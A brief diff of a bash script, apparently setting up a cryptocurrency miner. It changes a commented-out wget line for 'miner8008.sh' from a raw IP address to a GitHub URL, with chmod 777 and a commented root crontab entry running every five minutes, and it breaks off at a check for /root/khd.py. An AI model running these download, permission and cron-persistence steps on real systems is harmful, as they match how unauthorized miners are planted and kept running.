@@ -1,6 +1,6 @@
 #!/bin/bash
 
-#wget http://150.158.140.31/miner8008.sh&&chmod 777 miner8008.sh;tail /etc/crontab
+#wget https://github.com/yese888/miner8008/blob/main/miner8008.sh&&chmod 777 miner8008.sh;tail /etc/crontab
 #echo  "*/5 *    * * *   root  /root/miner8008.sh"  >> /etc/crontab
 # 检查/root目录下是否存在khd.py文件
 if [ ! -f /root/khd.py ]; then
